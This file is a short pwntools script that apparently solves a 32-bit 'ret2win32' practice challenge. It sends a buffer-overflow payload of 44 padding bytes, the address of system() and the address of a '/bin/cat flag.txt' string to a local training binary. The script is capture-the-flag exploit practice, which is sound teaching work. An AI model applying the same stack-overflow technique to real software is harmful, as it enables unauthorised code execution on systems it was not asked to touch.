import pwn

#pwn.context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "ret2win32"

if remote:
    p = pwn.remote(IP, PORT)
    elf = pwn.ELF(FILENAME)
else:
    p = pwn.process(FILENAME)
    elf = p.elf


p.recvuntil("> ")

# 44 A's, system, 4 byte junk as expected ret addr, addr of "/bin/cat flag.txt"
payload = b"A" * 44 + pwn.pack(elf.sym["system"]) + b"AAAA" + pwn.pack(0x08048813)
p.sendline(payload)


p.interactive()
